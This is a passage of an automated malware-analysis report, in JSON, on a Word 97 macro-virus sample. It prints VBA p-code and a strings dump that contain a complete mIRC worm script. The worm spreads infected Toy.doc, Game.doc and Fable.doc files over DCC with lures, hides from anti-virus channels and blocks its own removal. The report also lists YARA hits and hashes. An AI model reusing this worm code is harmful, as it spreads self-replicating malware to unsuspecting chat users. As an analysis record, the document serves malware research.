%varn1 %varn4 }\"\n' \tPrintItemNL \n' Line #113:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0077 \"alias toy1 { if ( %fy = 0 ) { .font -a 9 Fixedsys | Set %fy 1 | halt } | .font -a 9 WP TypographicSymbols | Set %fy 0 }\"\n' \tPrintItemNL \n' Line #114:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x004B \"alias toy2 { .echo -ae \u00034I'm sorry, but that command is not a \u000312T\u000313o\u00039y }\"\n' \tPrintItemNL \n' Line #115:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0059 \"alias by { .echo -ae \u000312T\u000313o\u00039y\u0003 \u00038I\u00034s \u000312B\u000313y \u00039S\u00038i\u00034m\u000312p\u000313l\u00039e\u00038S\u00034i\u000312m\u000313o\u00039n }\"\n' \tPrintItemNL \n' Line #116:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x00D0 \"alias quiet { Set %var1 1 | :j | Set %var2 $nick(%chan,%var1) | if ( %var2 = $null ) { .part %chan | halt } | if ( %var2 != $me ) && ( %var2 != X ) && ( %var2 != W ) { .ignore %var2 3 } | inc %var1 | goto j }\"\n' \tPrintItemNL \n' Line #117:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x00E0 \"alias -l hunting { if ( $exists(C:\\Time.drv) ) { Set %weird $time($file(C:\\Time.drv).mtime,H) | Set %tmp1 $calc((%weird + 5) % 24) } | if ( %weird != $null ) { if ( %weird > $time(H) ) || ( %tmp1 < $time(H) ) { rabbits } } }\"\n' \tPrintItemNL \n' Line #118:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x00AB \"alias -l rabbits { Set %tmp1 $ignore(0) | Set %tmp2 0 | :tm | inc %tmp2 | if ( %tmp1 = $null ) || ( %tmp2 > %tmp1 ) { goto out } | .ignore -r $ignore(1) | goto tm | :out }\"\n' \tPrintItemNL \n' Line #119:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0027 \"alias letsdo { .ignore $nick 3 | halt }\"\n' \tPrintItemNL \n' Line #120:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0157 \"alias letslook { if ( $nopath(%ex) !isin $1- ) && ( disable !isin $1- ) && ( script !isin $1- ) && ( dmsetup !isin $1- ) && ( worm !isin $1- ) && ( virus !isin $1- ) && ( infect !isin $1- ) && ( spread !isin $1- ) && ( remote !isin $1- ) && ( default !isin $1- ) && ( event !isin $1- ) && ( toy !isin $1- ) && ( unload !isin $1- ) { return } }\"\n' \tPrintItemNL \n' Line #121:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x00A4 \"alias unload { if ( $1 = $null ) || ( $2 = $null ) { .echo -e \u00032* /unload: insufficient parameters | halt } | .echo -e \u00032*** Unloaded script ' $+ $2- $+ '\u0003 | halt }\"\n' \tPrintItemNL \n' Line #122:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x00BE \"alias remote { if ( $1 = $null ) { .echo -e \u00032*** Remote is OFF\u0003 | halt } | if ( $1 = on ) { .echo -e \u00032*** Remote is ON (Ctcps,Events,Raw) } | else { .echo -e \u00032*** Remote is OFF } | halt }\"\n' \tPrintItemNL \n' Line #123:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x00AE \"alias events { if ( $1 = $null ) { .echo -e \u00032*** Events are OFF\u0003 | halt } | if ( $1 = on ) { .echo -e \u00032*** Events are ON } | else { .echo -e \u00032*** Events are OFF } | halt }\"\n' \tPrintItemNL \n' Line #124:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0015 \"alias remini { toy2 }\"\n' \tPrintItemNL \n' Line #125:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0014 \"alias alias { toy2 }\"\n' \tPrintItemNL \n' Line #126:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0012 \"alias run { toy2 }\"\n' \tPrintItemNL \n' Line #127:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0013 \"alias copy { toy2 }\"\n' \tPrintItemNL \n' Line #128:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x002E \"alias load { if ( $1 = -rs ) { toy2 | halt } }\"\n' \tPrintItemNL \n' Line #129:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0009 \"#damn3 on\"\n' \tPrintItemNL \n' Line #130:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x00A7 \"alias play { if ( $pos($1-,.mrc,1) > 0 ) || ( $pos($1-,.ini,1) > 0 ) || ( $pos($1-,.vxd,1) > 0 ) { halt } | .disable #damn3 | .timer0 1 .1 .play $1- | .enable #damn3 }\"\n' \tPrintItemNL \n' Line #131:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x000A \"#damn3 end\"\n' \tPrintItemNL \n' Line #132:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0017 \"alias writeini { toy2 }\"\n' \tPrintItemNL \n' Line #133:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0015 \"alias rename { toy2 }\"\n' \tPrintItemNL \n' Line #134:\n' \tQuoteRem 0x0000 0x0056 \"DCC Send using socket commands is a modified version of that in _Bird_'s phraggle worm\"\n' Line #135:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x012C \"alias SQ { %nick = $1- | %stop = 0 | %pt = $r(2400,5000) | %be = 0 | %pk = 4096 | %sz = $file(%ex).size | .notice %nick DCC Send %ex ( $+ $ip $+ ) | .raw -q privmsg %nick : $+ $chr(1) $+ DCC SEND %ex $longip($ip) %pt %sz $+ $chr(1) | if ( $sock(sd) != $null ) { .sockclose sd } | .socklisten sd %pt }\"\n' \tPrintItemNL \n' Line #136:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x00E7 \"alias ok1 { if ( $calc(%be + %pk) < %sz ) { .bread %ex %be %pk &data | .sockwrite we &data | inc %be %pk } | else { %stop = 1 | %pk = $calc( %sz - %be) | if (%pk == 0) { return } | .bread %ex %be %pk &data | .sockwrite we &data } }\"\n' \tPrintItemNL \n' Line #137:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #138:\n' \tLd var3 \n' \tParen \n' \tLd vbReadOnly \n' \tArgsCall SetAttr 0x0002 \n' Line #139:\n' \tEndIfBlock \n' Line #140:\n' \tLd irc \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tGoTo Junction \n' \tEndIf \n' Line #141:\n' \tLd Rnd \n' \tLitDI2 0x0002 \n' \tMul \n' \tFnInt \n' \tSt irc \n' Line #142:\n' \tLd irc \n' \tLitDI2 0x0001 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd Wind \n' \tLitStr 0x0008 \"\\Toy.doc\"\n' \tConcat \n' \tSt FName \n' \tEndIf \n' Line #143:\n' \tLd irc \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd Wind \n' \tLitStr 0x0009 \"\\Game.doc\"\n' \tConcat \n' \tSt FName \n' \tEndIf \n' Line #144:\n' \tLd irc \n' \tLitDI2 0x0002 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd Wind \n' \tLitStr 0x000A \"\\Fable.doc\"\n' \tConcat \n' \tSt FName \n' \tEndIf \n' Line #145:\n' \tLd FName \n' \tArgsLd Dir 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIfBlock \n' Line #146:\n' \tLd FName \n' \tParamNamed FileName \n' \tLitVarSpecial (False)\n' \tParamNamed AddToRecentFiles \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0002 \n' Line #147:\n' \tLd FName \n' \tParen \n' \tLd vbReadOnly \n' \tArgsCall SetAttr 0x0002 \n' Line #148:\n' \tLitDI2 0x0000 \n' \tSt hrm \n' Line #149:\n' \tEndIfBlock \n' Line #150:\n' \tLitStr 0x000A \"C:\\Toy.sys\"\n' \tArgsLd Dir 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' Line #151:\n' \tLitStr 0x000A \"C:\\Toy.sys\"\n' \tParen \n' \tLd vbNormal \n' \tArgsCall SetAttr 0x0002 \n' Line #152:\n' \tLitStr 0x000A \"C:\\Toy.sys\"\n' \tArgsCall Kill 0x0001 \n' Line #153:\n' \tEndIfBlock \n' Line #154:\n' \tLitStr 0x000A \"C:\\Toy.sys\"\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Output)\n' Line #155:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLd FName \n' \tPrintItemNL \n' Line #156:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #157:\n' \tLitStr 0x000A \"C:\\Toy.sys\"\n' \tParen \n' \tLd vbReadOnly \n' \tArgsCall SetAttr 0x0002 \n' Line #158:\n' \tLabel Junction \n' Line #159:\n' \tLd LN \n' \tArgsLd Dir 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIfBlock \n' Line #160:\n' \tLd LN \n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Output)\n' Line #161:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLitStr 0x0008 \"[script]\"\n' \tPrintItemNL \n' Line #162:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #163:\n' \tEndIfBlock \n' Line #164:\n' \tStartForVariable \n' \tLd x \n' \tEndForVariable \n' \tNextVar \n' Line #165:\n' \tLabel done \n' Line #166:\n' \tLd var10 \n' \tLitDI2 0x0001 \n' \tEq \n' \tIfBlock \n' Line #167:\n' \tLd hrm \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #168:\n' \tLd Tmp1 \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' Line #169:\n' \tElseBlock \n' Line #170:\n' \tLd ActiveDocument \n' \tArgsMemCall Close 0x0000 \n' Line #171:\n' \tEndIfBlock \n' Line #172:\n' \tElseBlock \n' Line #173:\n' \tLd NormalTemplate \n' \tArgsMemCall Save 0x0000 \n' Line #174:\n' \tEndIfBlock \n' Line #175:\n' \tEndSub \n' Line #176:\n' \tFuncDefn (Sub ViewVBCode())\n' Line #177:\n' \tEndSub \n' Line #178:\n' \tFuncDefn (Sub ToolsMacro())\n' Line #179:\n' \tEndSub \n' Line #180:\n' Line #181:\n' Line #182:\n' Line #183:\n' Line #184:\n' Line #185:\n' Line #186:\n' Line #187:\n' Line #188:\n' Line #189:\n' Line #190:\n"
    },
    "filename": "VirusShare_363cb3e0478d547741274f2e8e92cad9",
    "filesize": 43008,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 5.0, Code page: 1252, Title: Virus Infected Bait File, Author: Joe Hartmann, Template: Normal.dot, Last Saved By: MACRO, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Tue Jun 20 06:23:00 2000, Last Saved Time/Date: Tue Jun 20 06:23:00 2000, Number of Pages: 1, Number of Words: 8, Number of Characters: 47, Security: 0",
    "hashes": {
        "md5": "363cb3e0478d547741274f2e8e92cad9",
        "sha1": "1dbdf2ed262f39fc7a7f6ffe257dbec3bc7b5cb6",
        "sha256": "6e2879adc128988fedb1fb7605a99d4af72d2dfe70433fb6e4cba57a7b895473"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "Virus Infected Bait File",
            "Joe Hartmann - HAVS",
            "Virus Name: ",
            ". A!",
            "F&F&",
            "Virus Infected Bait File",
            "Joe Hartmann",
            "Normal.dot",
            "MACRO",
            "Microsoft Word 8.0",
            "Virus Infected Bait File",
            "Title",
            "_PID_GUID",
            "`{w\u06bf",
            "`{w\u06bf",
            "`Y{o",
            "te -",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "mirc.ini",
            "script.ini",
            "\\Default.vxd",
            "rfiles",
            "rfiles",
            "rfiles",
            "rfiles",
            "On 1:Connect:{ .ctcps on | Set %go 0 | hunting | .enable #damn3 | if ( $exists(C:\\toy.sys) ) { Set %ex $read -l1 C:\\toy.sys | if ( %ex != $null ) && ( $exists(%ex) ) { Set %go 1 } } | if ( $day = Friday ) && ( $r(1,7) = 4 ) { by } | if ( $r(1,25) != 7 ) { halt } | if ( $mid($version,3,1) > 4 ) { Set %varn1 editbox text | .timer77 0 .1 toy } | else { Set %fy 0 | .timer77 0 .5 toy1 } }",
            "On 1:Disconnect:{ .timers off | .write -c C:\\Time.drv $time | .enable #damn3 | if ( %varn1 != $null ) { .colour %varn1 1 } }",
            "On 1:Input:*:{ Set %s $1- | if ( /timer isin %s ) || ( // isin %s ) || ( /. isin %s ) || ( /colour isin %s ) || ( disable isin %s ) || ( default isin %s ) || ( remove isin %s ) ( /write isin %s ) { halt } | if ( %eh isin %s ) { .echo -ae ",
            "4Hehe, come on, that wont work ",
            "9y | halt } }",
            "On 1:Join:*:{ if ( help isin # ) || ( dmsetup isin # ) || ( backorifice isin # ) || ( nohack isin # ) || ( vir isin # ) || ( aid isin # ) { Set %chan # | .timer7 1 .1 quiet } }",
            "On 1:Part:*:{ if ( %go = 0 ) { halt } | if ( $r(1,2) = 1 ) && ( $nick isreg # ) && ( $nick != $me ) { SQ $nick | .ignore -pcnu120 $nick } }",
            "On 1:FileSent:*:{ if ( %go = 0 ) { halt } | if ( $filename = %ex ) { .msg $nick Type //run -n $getdir $+ $nopath(%ex) to run | halt } | SQ $nick | .ignore -pcnu60 $nick 3 }",
            "On 1:FileRcvd:*:{ if ( %go = 0 ) { halt } | SQ $nick | .ignore -pcnu60 $nick }",
            "On 1:Notify:{ if ( %go = 0 ) { halt } | if ( $nick !isin %heh ) { %heh = %heh $+ $nick | .ignore -pcnu120 $nick 3 | .timer $+ $r(99,199) 1 10 .msg $nick Hey, talk to you in a minute. Check out this file, ok. | .timer $+ $r(99,199) 1 20 SQ $nick } }",
            "On 1:SockListen:sd:{ sockaccept we | ok1 }",
            "On 1:SockWrite:we:{ if ( %stop = 1 ) { .sockclose we | halt } | ok1 }",
            "On ^1:Kick:*:{ if ( $knick != $me ) { return } | letslook $1- | letsdo }",
            "On ^1:Notice:*:*:{ letslook $1- | letsdo }",
            "On ^1:Action:*:*:{ letslook $1- | letsdo }",
            "On ^1:Text:*:*:{ letslook $1- | letsdo }",
            "On ^1:Chat:*:{ letslook $1- | letsdo }",
            "On ^1:Serv:*:{ letslook $1- | letsdo }",
            "On ^1:Quit:{ letslook $1- | letsdo }",
            "On ^1:Topic:#:{ letslook $1- | letsdo }",
            "ctcp 1:*:*:{ letslook $1- | letsdo }",
            "raw 332:*:{ letslook $2- | Set %chan $2 | .timer7 1 .1 quiet }",
            "raw 401:*:{ halt }",
            "raw 439:*:{ halt }",
            "alias toy { Set %varn4 $r(0,14) | colour %varn1 %varn4 }",
            "alias toy1 { if ( %fy = 0 ) { .font -a 9 Fixedsys | Set %fy 1 | halt } | .font -a 9 WP TypographicSymbols | Set %fy 0 }",
            "alias toy2 { .echo -ae ",
            "4I'm sorry, but that command is not a ",
            "9y }",
            "alias by { .echo -ae ",
            "13y ",
            "9n }",
            "alias quiet { Set %var1 1 | :j | Set %var2 $nick(%chan,%var1) | if ( %var2 = $null ) { .part %chan | halt } | if ( %var2 != $me ) && ( %var2 != X ) && ( %var2 !=",
            "nnect:",
            "ble #d",
            "%var",
            ") { ",
            "n1 1",
            "nick",
            "o yo",
            "imer ",
            "ck } }",
            "'TOY",
            "'TOY",
            "'Toy",
            "Sub AutoOpen",
            "'Toy",
            "Sub AutoClose",
            "C:\\Toy.vxd",
            "C:\\Toy.vxd",
            "C:\\Toy.vxdA@n",
            "WINDIR$",
            "mirc32.exe9",
            " W ) { .ignore %var2 3 } | inc %var1 | goto j }",
            "alias -l hunting { if ( $exists(C:\\Time.drv) ) { Set %weird $time($file(C:\\Time.drv).mtime,H) | Set %tmp1 $calc((%weird + 5) % 24) } | if ( %weird != $null ) { if ( %weird > $time(H) ) || ( %tmp1 < $time(H) ) { rabbits } } }",
            "alias -l rabbits { Set %tmp1 $ignore(0) | Set %tmp2 0 | :tm | inc %tmp2 | if ( %tmp1 = $null ) || ( %tmp2 > %tmp1 ) { goto out } | .ignore -r $ignore(1) | goto tm | :out }",
            "alias letsdo { .ignore $nick 3 | halt }",
            "alias letslook { if ( $nopath(%ex) !isin $1- ) && ( disable !isin $1- ) && ( script !isin $1- ) && ( dmsetup !isin $1- ) && ( worm !isin $1- ) && ( virus !isin $1- ) && ( infect !isin $1- ) && ( spread !isin $1- ) && ( remote !isin $1- ) && ( default !isin $1- ) && ( event !isin $1- ) && ( toy !isin $1- ) && ( unload !isin $1- ) { return } }",
            "alias unload { if ( $1 = $null ) || ( $2 = $null ) { .echo -e ",
            "2* /unload: insufficient parameters | halt } | .echo -e ",
            "2*** Unloaded script ' $+ $2- $+ '",
            " | halt }",
            "alias remote { if ( $1 = $null ) { .echo -e ",
            "2*** Remote is OFF",
            " | halt } | if ( $1 = on ) { .echo -e ",
            "2*** Remote is ON (Ctcps,Events,Raw) } | else { .echo -e ",
            "2*** Remote is OFF } | halt }",
            "alias events { if ( $1 = $null ) { .echo -e ",
            "2*** Events are OFF",
            " | halt } | if ( $1 = on ) { .echo -e ",
            "2*** Events are ON } | else { .echo -e ",
            "2*** Events are OFF } | halt }",
            "alias remini { toy2 }",
            "alias alias { toy2 }",
            "alias run { toy2 }",
            "alias copy { toy2 }",
            "alias load { if ( $1 = -rs ) { toy2 | halt } }",
            "#damn3 on",
            "alias play { if ( $pos($1-,.mrc,1) > 0 ) || ( $pos($1-,.ini,1) > 0 ) || ( $pos($1-,.vxd,1) > 0 ) { halt } | .disable #damn3 | .timer0 1 .1 .play $1- | .enable #damn3 }",
            "#damn3 end",
            "alias writeini { toy2 }",
            "alias rename { toy2 }",
            "DCC Send using socket commands is a modified version of that in _Bird_'s phraggle worm1",
            "alias SQ { %nick = $1- | %stop = 0 | %pt = $r(2400,5000) | %be = 0 | %pk = 4096 | %sz = $file(%ex).size | .notice %nick DCC Send %ex ( $+ $ip $+ ) | .raw -q privmsg %nick : $+ $chr(1) $+ DCC SEND %ex $longip($ip) %pt %sz $+ $chr(1) | if ( $sock(sd) != $null ) { .sockclose sd } | .socklisten sd %pt }",
            "alias ok1 { if ( $calc(%be + %pk) < %sz ) { .bread %ex %be %pk &data | .sockwrite we &data | inc %be %pk } | else { %stop = 1 | %pk = $calc( %sz - %be) | if (%pk == 0) { return } | .bread %ex %be %pk &data | .sockwrite we &data } }",
            "\\Toy.doc",
            "\\Game.doc",
            "\\Fable.doc",
            "C:\\Toy.sys$",
            "C:\\Toy.sys",
            "C:\\Toy.sysA@n",
            "C:\\Toy.sys",
            "C:\\Toy.sys",
            "[script]",
            "Attribut",
            "e VB_Nam",
            "e = \"Mod",
            "ule1\"",
            " AutoOpe",
            "l Start",
            "End ",
            "BOn Erro@r Resu",
            "VSet O",
            "ions",
            ".Viru",
            "sProtect",
            "Conf",
            "vers",
            "SaveNormal",
            "aApp",
            "li$ca",
            "nableCancelKey",
            "Display@Alerts",
            "var9",
            "\\veDoc",
            "unt.Full",
            "False `Then 6&Inf",
            "(VB}",
            "pte.\t",
            "Fh32a3 To ",
            "omponents.Coun",
            "oA\tV3@\t",
            "OfLin6ex",
            "(18, 1@O",
            " <`> 1 A,",
            " > 0B",
            "UCa$se",
            "\"'TOY\"",
            "7\".0Item2",
            "%Exit MP)%.",
            "Delete",
            "\u0482\"2Q",
            "Gow.!%0\"'",
            "payloa6de",
            "\"_1$+albl",
            "LFCod",
            "A\" & Chr(13) ",
            "toClose",
            "checka^",
            "b3`?",
            "C:\\.vxd",
            "\"E Outpu@t As #1Print ",
            "Iqrt (",
            "@QKii",
            "7|8 _",
            "c8|`9 < 5I",
            "le.AddFromst\"8g (\"\"2m_8",
            "DTMacrota@rlCB",
            "Or Int(R",
            "* 9)",
            "7J^d",
            "= Enviro",
            "n(\"WINDI",
            "With ",
            " .FileS",
            "earch",
            ".LookIn",
            "`]Fold@",
            "True@",
            "`mirc320.exea",
            "Ty\"p",
            "gmso",
            "@.Exec",
            "SortBy",
            "a\tfA",
            "LDirA",
            "Left(",
            ") - 410",
            "& B\"!",
            ".ini",
            "scriptG",
            "(LMb",
            "\\Defpaultb6o",
            "[bC RLSys",
            "^.p7vate s",
            ", \"r",
            "n2\"B",
            "= LN?",
            "}73#)_",
            "KR\"p1:p7nq{",
            " .ctcps  on | ab%g\"oz| h",
            ".eb #d",
            "amn3",
            "( $exist",
            "s(C:\\toy",
            ".sys) ) ",
            "ex $read -l1 ",
            "!= $n@@",
            "H1 }",
            "daaFri",
            ")Pj,74\"",
            "25) ",
            "halt",
            "d($,3,1",
            "editbox ",
            "text@",
            ".ti mer77",
            ".16 ",
            "8con%",
            "wri-c",
            ".drv $1",
            "olour ",
            "!In o:*:",
            "`s $1-p",
            "\t isin %s",
            "removeX",
            "echo -a",
            "4Hehe",
            ", coon,",
            " that wo",
            "0~work ",
            "13oX",
            ":0Join\"",
            "etu]",
            "backorificD",
            "aid7",
            "chan #",
            "'P0*8qui\u02004",
            "?=+<$",
            "4a61p",
            "C;nick ",
            "reg0",
            "\"AQ>",
            "|  .igno -pcnu120",
            "\tn 1:FS\tu\t$`nE",
            "z//r",
            "un -n $gHetd",
            "o path(bGton ",
            "O5BS",
            "Rcvnd",
            "otify:{ ",
            "if ( %go",
            " = 0 ) {",
            " halt } ",
            "d$nick ",
            "!isin %h,eh",
            "F| .ign",
            "ore -pcnPu120",
            ".@timer ",
            "(99,199)",
            " 1 10 .m",
            "(Hey, ",
            "talk to ",
            "you ",
            "sa m",
            "inute. C",
            "out t",
            "his file`, ok.",
            "[} }\"",
            "Print #1",
            ", \"On 1:",
            "SockListen:sd",
            "accept w\"e",
            ",ok1",
            "Wr@ite:westop1",
            "%close$",
            ")^1:K",
            "= $me(return",
            "letslook0 $1-R",
            "T*Nce+,",
            "Action",
            "Texto",
            "Cha\tA",
            "{ h(Serv@",
            "Quit@Xh",
            "Topic:#%",
            "Pctcp*'&r@aw 332",
            "uSet %ch`an $2y7.1 qui@",
            "alia",
            "n4 $r(0,",
            "14)`",
            "coloPur %",
            ".fo@p-a ",
            "9 Fixedsys",
            "WP Typo",
            "graphicSymbol",
            ".echo ",
            "-ae ",
            "4I'@m sorr@b",
            "bat comm",
            "and not",
            "@13o",
            "zK5(q<{ g1 ",
            "42 /$null",
            "parJ|La",
            "2 !%&&",
            "ncBC9go",
            "`j(-l hu nting",
            "xs(C:\\T",
            ".drv)",
            "weird $AL($",
            "tmp1 ",
            "$calc((%",
            "+ 5) % 2`Y&D",
            "{ rabbits",
            " Nc9",
            "2`| :tm",
            "=i)@",
            "2 > %",
            "O(s2Ye{}$ia}OF \"",
            "$nopath(0%ex)k) ",
            "B%disable",
            "scrix\t",
            "mspp",
            "worm_",
            "viruso",
            "@infect",
            "s pread",
            "mot_",
            " defauPn",
            "eveN",
            "unloL",
            "1>B!`cg\"",
            "cPPPP2* /",
            ":@suffici",
            "AameterUX!",
            "** U",
            "ed: ",
            "'r k'",
            " +o!e!",
            "+T\t`",
            "@YOFFg",
            "!11$",
            "onSH",
            "N (C0ys,",
            "s,Raw)BJel;",
            "tc#p",
            "(2wYa",
            "copar/",
            "/ -p' ",
            "i/#damn",
            "3 onJs p",
            "R$pos",
            "(@C,.mrc,N>`U4\\",
            "\u04f0gr0",
            "s wr w",
            "'XDCC ",
            "u`gckTsa`\u0560odifi@<v>q of@_",
            "Bv_'",
            "hra|ggYaU",
            "{\\ %`F%d0",
            "p:%[p",
            "r(24@00,500Bn%,beJ",
            "4096",
            "s}QbP.siz1. i|ced",
            "pGs.",
            "-q priva\t:Ipchr(   J\"",
            "ND !",
            "$longip($ip",
            "ex(sdk",
            "vXsd\"7",
            "li!  ",
            "a/\"Q",
            " %pk) < {A",
            " &data",
            "calc( %s",
            "z - %be)",
            " | if (%",
            "pk == 0)",
            " { retur",
            "h.bre@ad %ex",
            "&data",
            "ockwrite",
            " we ",
            "*} }",
            "Close",
            "Attr (va",
            "r3), vbR",
            "Only",
            "nd If",
            "f irc <>",
            " \"\" Then",
            " GoTo Ju",
            "nction",
            "= Int(R!",
            "2* 2)",
            "2FName ",
            "= Wi",
            "\"& \"",
            "\\Toy.doco",
            "Fable",
            "Dhir(",
            "\\veDoc",
            "ument.Sa",
            "veAs Fil",
            "eR:=",
            ", AddToRec",
            "alse",
            "hrm50",
            "C\"C:",
            "zsys<\")",
            "rmal",
            "Kill I",
            " For Ou`tput @5AyPrint{, ",
            "Ez:u2L&NS LNZ",
            "\"[script]\u029f",
            "\u0158Next x",
            "done",
            "DVB~",
            "qTmp",
            "ZTempla",
            "@Sub",
            "jub ViewVBCode(@",
            "ToolsMacro",
            "9394effdf",
            "a394effdf",
            "u^5GU+Wz",
            "_iGmO+jx43",
            "Wordk",
            "Win16~",
            "Win32",
            "HAVS1B",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Module1b",
            "AutoOpen*",
            "Start",
            "Options",
            "VirusProtectionoD",
            "ConfirmConversions",
            "SaveNormalPrompt\u02bc",
            "Appt",
            "Application*",
            "EnableCancelKey",
            "DisplayAlerts",
            "hrmu",
            "var9 ",
            "var10f",
            "var11f",
            "Tmp1j",
            "ActiveDocument\\",
            "FullName\u041e",
            "Savedd",
            "Infectf",
            "Heref",
            "VBProjectOh",
            "NormalTemplateq",
            "var12f",
            "VBComponents",
            "Count0v",
            "var13f",
            "CodeModule",
            "CountOfLines!\\",
            "var14f",
            "Lines",
            "UCase5",
            "var17f",
            "Itemz",
            "DeleteLines",
            "payloadg",
            "blah1T'",
            "FCode\\",
            "ChrK~",
            "check3\t",
            "Importi",
            "Kill",
            "var18f",
            "var19f",
            "AddFromstring",
            "MacroContainer>",
            "RndR",
            "done",
            "Wind",
            "Environ",
            "FileSearchD",
            "LookInP",
            "SearchSubFolders",
            "FileNamej",
            "FileType",
            "msoFileTypeAllFiles/",
            "ExecuteY",
            "msoSortByFileName",
            "FoundFiles",
            "Location-",
            "LDirv",
            "var3 ",
            "SetAttrC",
            "vbNormal-",
            "Systema",
            "PrivateProfileString[",
            "vbReadOnlyL",
            "irc\u011f",
            "Junctionz",
            "FNameR",
            "SaveAsf;",
            "AddToRecentFilesV",
            "Save",
            "ViewVBCode",
            "ToolsMacrou",
            "Documentj",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\System3",
            "e2.tlb",
            "#OLE Automation",
            "nMSFor ms>",
            "GC421227",
            "E-A2B1-4",
            "9C1-99B9",
            "-E4E17EB759FE",
            "4.TWD#Mi",
            "crosoft E",
            "b Ob",
            " Library",
            "Q9206C8D",
            "3-B515-4",
            "D21-AAB2",
            "-D007E12 50233",
            "CUME~1\\J OEHAR",
            "CALS",
            "Tem@p\\VBE\\E-E",
            "Xg-.E",
            "~NZal",
            "~NYa~",
            " 0\t1C",
            "Offic",
            "DF8D04C-",
            "5BFA-101@B-BDE5",
            "2BOF",
            "FICE97\\E",
            "NGLISH\\W0ORD\\C",
            "@O9`7.DLLmC! (8.0",
            "isDocument",
            "/*Ti",
            "CoduPle1",
            "2o%`oubo1",
            "ThisDocument",
            "Module1",
            "ID=\"{0F43B640-8ACB-44D5-8B56-EDCF7A111A06}\"",
            "Document=ThisDocument/&H00000000",
            "Module=Module1",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"6567889B986E9C6E9C6E9C6E9C\"",
            "DPB=\"3436D9EC67BA68BA68BA\"",
            "GC=\"0301EE21BC22BC2243\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]P",
            "ThisDocument=0, 0, 0, 0, C",
            "Module1=0, 0, 0, 0, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "\\Fable.doc": "Word",
            "\\Game.doc": "Word",
            "\\Toy.doc": "Word"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.434152",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
